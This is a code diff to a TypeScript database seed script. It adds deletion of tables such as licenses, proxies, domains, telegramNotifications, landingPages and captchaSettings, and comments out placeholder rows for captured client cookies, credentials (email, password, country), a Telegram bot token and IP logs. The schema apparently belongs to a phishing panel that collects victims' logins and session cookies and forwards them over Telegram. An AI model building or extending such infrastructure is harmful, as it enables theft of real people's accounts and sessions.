@@ -4,6 +4,17 @@ import {
   clients,
   clientCookies,
   credentials,
+  licenses,
+  adminSessions,
+  proxySettings,
+  proxies,
+  domains,
+  telegramNotifications,
+  
+  landingPages,
+  defaultServices,
+  singleLinkSettings,
+  captchaSettings
 } from "./schema/main.schema";
 
 import {
@@ -26,94 +37,105 @@ async function seed() {
     await securityDb.delete(tokens);
     await securityDb.delete(ipLog);
     await securityDb.delete(trackingCookies);
+    await securityDb.delete(licenses);
+    await securityDb.delete(adminSessions);
+    await securityDb.delete(proxySettings);
+    await securityDb.delete(proxies);
+    await securityDb.delete(domains);
+    await securityDb.delete(telegramNotifications);
+    await securityDb.delete(landingPages);
+    await securityDb.delete(defaultServices);
+    await securityDb.delete(singleLinkSettings);
+    await securityDb.delete(captchaSettings);
+    await securityDb.delete(settings);
 
   // CLIENTS
-  await mainDb.insert(clients).values([
-    {
-      sessionId: "sess_1",
-      client_ip: "192.168.1.1",
-      first_seen: new Date().toISOString(),
-      last_seen: new Date().toISOString(),
-    },
-    {
-      sessionId: "sess_2",
-      client_ip: "192.168.1.2",
-      first_seen: new Date().toISOString(),
-      last_seen: new Date().toISOString(),
-    },
-  ]);
+//   await mainDb.insert(clients).values([
+//     {
+//       sessionId: "sess_1",
+//       client_ip: "192.168.1.1",
+//       first_seen: new Date().toISOString(),
+//       last_seen: new Date().toISOString(),
+//     },
+//     {
+//       sessionId: "sess_2",
+//       client_ip: "192.168.1.2",
+//       first_seen: new Date().toISOString(),
+//       last_seen: new Date().toISOString(),
+//     },
+//   ]);
 
-  // COOKIES
-  await mainDb.insert(clientCookies).values([
-    {
-      sessionId: "sess_1",
-      timestamp: new Date().toISOString(),
-      cookies: JSON.stringify({
-        token: "abc123",
-      }),
-    },
-  ]);
+//   // COOKIES
+//   await mainDb.insert(clientCookies).values([
+//     {
+//       sessionId: "sess_1",
+//       timestamp: new Date().toISOString(),
+//       cookies: JSON.stringify({
+//         token: "abc123",
+//       }),
+//     },
+//   ]);
 
-  // CREDENTIALS
-  await mainDb.insert(credentials).values([
-    {
-      sessionId: "sess_1",
-      timestamp: new Date().toISOString(),
-      email: "admin@example.com",
-      password: "password123",
-      country: "Nigeria",
-    },
-  ]);
+//   // CREDENTIALS
+//   await mainDb.insert(credentials).values([
+//     {
+//       sessionId: "sess_1",
+//       timestamp: new Date().toISOString(),
+//       email: "admin@example.com",
+//       password: "password123",
+//       country: "Nigeria",
+//     },
+//   ]);
 
-  // SETTINGS
+//   // SETTINGS
 
-const settingsData = [
-  {
-    key: "BOT_TOKEN",
-    value: "123456",
-  },
-  {
-    key: "CHAT_ID",
-    value: "999999",
-  },
-];
+// const settingsData = [
+//   {
+//     key: "BOT_TOKEN",
+//     value: "123456",
+//   },
+//   {
+//     key: "CHAT_ID",
+//     value: "999999",
+//   },
+// ];
 
-for (const item of settingsData) {
-  await configDb
-    .insert(settings)
-    .values(item)
-    .onConflictDoUpdate({
-      target: settings.key,
-      set: {
-        value: item.value,
-      },
-    });
-}
+// for (const item of settingsData) {
+//   await configDb
+//     .insert(settings)
+//     .values(item)
+//     .onConflictDoUpdate({
+//       target: settings.key,
+//       set: {
+//         value: item.value,
+//       },
+//     });
+// }
 
-  // TOKENS
-  await securityDb.insert(tokens).values([
-    {
-      token: "token_123",
-      created_at: Math.floor(Date.now() / 1000),
-    },
-  ]);
+//   // TOKENS
+//   await securityDb.insert(tokens).values([
+//     {
+//       token: "token_123",
+//       created_at: Math.floor(Date.now() / 1000),
+//     },
+//   ]);
 
-  // IP LOGS
-  await securityDb.insert(ipLog).values([
-    {
-      ip: "127.0.0.1",
-      timestamp: Date.now(),
-    },
-  ]);
+//   // IP LOGS
+//   await securityDb.insert(ipLog).values([
+//     {
+//       ip: "127.0.0.1",
+//       timestamp: Date.now(),
+//     },
+//   ]);
 
-  // TRACKING COOKIES
-  await securityDb.insert(trackingCookies).values([
-    {
-      cookie_value: "cookie_123",
-      ip: "127.0.0.1",
-      created_at: Math.floor(Date.now() / 1000),
-    },
-  ]);
+//   // TRACKING COOKIES
+//   await securityDb.insert(trackingCookies).values([
+//     {
+//       cookie_value: "cookie_123",
+//       ip: "127.0.0.1",
+//       created_at: Math.floor(Date.now() / 1000),
+//     },
+//   ]);
 
   console.log("✅ Database seeded successfully");
 }
